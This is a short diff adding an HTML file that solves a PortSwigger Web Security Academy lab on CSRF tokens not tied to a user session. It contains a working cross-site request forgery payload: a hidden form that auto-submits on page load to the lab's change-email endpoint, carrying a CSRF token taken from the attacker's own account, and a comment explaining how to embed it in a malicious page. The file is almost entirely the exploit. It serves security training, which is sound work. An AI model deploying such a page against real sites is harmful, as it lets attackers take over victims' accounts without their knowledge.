@@ -1,0 +1,14 @@
+<!-- https://portswigger.net/web-security/csrf/lab-token-not-tied-to-user-session -->
+<html>
+    <body>
+        <form method="POST" action="https://0a9b00f3033e9ef4c01a92870041005f.web-security-academy.net/my-account/change-email">
+            <input type="hidden" name="email" value="email@test.com">
+            <input required="" type="hidden" name="csrf" value="BdIUgvsvzhOzQbrFuy4k8O4yfyojNsJH">
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
+
+<!-- The CSRF token is not tied to a user session, so you can login with your own account, copy the csrf token, and embed it in a malicious web page to be form a csrf attack on a user -->
